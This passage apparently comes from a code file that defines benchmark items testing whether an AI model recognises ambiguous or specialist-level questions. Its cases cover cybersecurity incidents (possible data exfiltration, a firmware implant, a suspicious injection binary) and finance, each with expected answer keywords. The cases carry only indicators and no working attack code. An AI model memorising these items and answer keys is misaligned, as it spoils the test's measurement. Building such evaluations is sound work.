- Destination: 52.84.132.XX (Amazon CloudFront IP range)
- Protocol: HTTPS (TLS 1.3)
- Volume: 800MB-1.2GB outbound daily for the past 12 days
- Timing: Traffic occurs in bursts every 4 hours (06:00, 10:00, 14:00, 18:00, 22:00, 02:00 UTC)
- Each burst consists of 40-60 HTTPS POST requests averaging 3-4MB each
- The server previously had near-zero outbound traffic to external hosts

INVESTIGATION SO FAR:
- The server runs an internal ML training pipeline that processes proprietary customer behavior data
- The CloudFront distribution behind the destination IP could not be immediately identified — it does not match any company-owned CloudFront distributions
- A developer on the ML team says they "recently added a new model telemetry integration that sends training metrics to Weights & Biases (wandb.ai)" — W&B does use CloudFront for its data ingestion endpoints
- However, the developer cannot produce a ticket, change request, or approval for this integration
- The volume (800MB-1.2GB daily) seems excessive for training metrics — W&B telemetry is typically <10MB/day
- Packet captures of the TLS handshakes show the SNI field is "api.wandb.ai" in some requests and blank (encrypted) in others via Encrypted Client Hello (ECH)
- The developer's SSH key was used to deploy the integration, but the developer says they don't remember the exact implementation details because they "used a script from a blog post"
- DNS logs show the server also queried "api.wandb.ai" AND a second domain "ml-sync.dataflow-analytics[.]io" (registered 14 days ago via a privacy-preserving registrar)`, question: "Is this legitimate ML telemetry, data exfiltration, or something else? What action should be taken?", answerKeywords: ["ambiguous", "uncertain", "investigate", "forensic", "cannot determine", "exfiltration possible"] },
      { id: "abs_fin_002", domain: "finance", answerability: "ambiguous", difficulty: 4, case: "Biotech ($800M mcap), single Phase 3 drug, readout in 2 weeks. Price $42, target $85 (approve) or $8 (fail). Success estimates 35-65%. CMO sold $2.4M (pre-scheduled 10b5-1). Company raised $150M for 'commercial launch.'", question: "Should a moderate-risk client invest ahead of the readout?", answerKeywords: ["binary", "uncertain", "coin flip", "risk"] },
      { id: "abs_cyber_004", domain: "cybersecurity", answerability: "specialist", difficulty: 5, case: `During a supply chain security audit, a hardware security team discovers anomalous behavior on 3 of 200 network switches (Arista 7280R3 series) received in a recent shipment for a new data center buildout.

FINDINGS:
- The 3 switches' UEFI firmware images (extracted via SPI flash dump) have a SHA-256 hash that does not match the vendor's published reference hash for the firmware version
- The firmware size is 247 bytes larger than the reference image
- Strings analysis of the delta shows an additional EFI DXE driver module not present in the reference image
- The extra module contains x86 assembly that appears to hook the network stack initialization
- Runtime behavioral analysis shows the switches briefly (200ms) transmit 3 UDP packets to a hardcoded IP (203.0.113.47) on port 53 (DNS) during boot, before the configured management interface is initialized
- After the initial boot transmission, no further anomalous traffic is observed
- The switches passed all functional tests and performance benchmarks
- The 3 affected switches were all from the same pallet in the shipment; the remaining 197 switches have matching reference hashes
- The vendor (Arista) states they have "no knowledge of any firmware modifications" and their tamper-evident seals appeared intact

The CISO asks: "Is this a nation-state supply chain implant, a manufacturing defect, a QA testing artifact, or something else? Should we deploy these switches or return the entire shipment?"`, question: "What is this firmware anomaly, and should the affected switches be deployed?", answerKeywords: ["specialist", "firmware", "reverse engineer", "quarantine", "do not deploy", "forensic", "CISA"] },
      { id: "abs_cyber_005", domain: "cybersecurity", answerability: "specialist", difficulty: 3, case: `An endpoint detection tool flags a binary file found on a developer's laptop during a routine sweep:

FILE DETAILS:
- Path: C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost_helper.exe
- Size: 1.8 MB
- File created: 2 days ago
- Digital signature: Not signed (no Authenticode signature)
- VirusTotal: 3 of 72 engines flag it (Kaspersky: "HEUR:Trojan.Win32.Generic", Avira: "TR/Agent.dcpms", CrowdStrike: "No detection")
- Strings analysis reveals: "HTTP/1.1", "POST", "Content-Type: application/octet-stream", a hardcoded IP address, and references to "kernel32.dll", "CreateRemoteThread", "VirtualAllocEx", "WriteProcessMemory"
- The binary imports: WinHTTP functions, process injection APIs, and registry modification functions
- File entropy: 7.2 (high, suggesting packed or encrypted sections)

CONTEXT:
- The developer (jsmith) works on the Windows platform team and regularly develops low-level system utilities
- jsmith says: "I was testing a process injection technique for our crash dump collector — we need to inject a monitoring DLL into customer processes to capture crash data. I compiled it from my dev branch 2 days ago."
- jsmith's Git history does show commits to a 'crash-collector' branch with process injection code, but the compiled binary's hash does not match a build from that branch's HEAD
- The developer's manager says the crash dump collector project is a legitimate approved initiative`, question: "Is svchost_helper.exe malware or a legitimate development artifact? Should the binary be quarantined and the developer's access revoked?", answerKeywords: ["insufficient", "reverse engineer", "cannot determine", "quarantine binary", "analyze", "compare source"] },
      { id: "abs_fin_003", domain: "finance", answerability: "specialist", difficulty: 5, case: "US multinational hedging €500M annual revenue. Options: 12mo forward, zero-cost collar, participating forward, or cross-currency swap on €300M debt. Intercompany transfer pricing under IRS audit. Tax rates 12.5-30% across EU.", question: "Which hedging strategy maximizes after-tax cash flow with ASC 815 eligibility?", answerKeywords: ["specialist", "derivatives", "tax", "ASC 815", "defer"] },
    ],
  },
};

export const TASK_ORDER = ["ef1", "mc1", "mc2"];
